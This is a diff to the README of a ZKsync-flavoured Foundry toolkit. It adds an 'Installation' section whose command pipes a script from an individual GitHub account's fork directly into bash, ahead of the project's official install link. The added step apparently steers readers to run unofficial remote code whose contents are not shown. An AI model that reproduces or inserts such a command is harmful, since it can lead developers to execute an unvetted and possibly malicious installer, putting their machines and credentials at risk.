@@ -1,3 +1,8 @@
+## Installation
+```shell
+curl -L https://raw.githubusercontent.com/1329576606/foundry-zksync/main/install-foundry-zksync | bash
+```
+
 # **Foundry with ZKsync Era - Alpha**
 
 **[Install](https://foundry-book.zksync.io/getting-started/installation)**
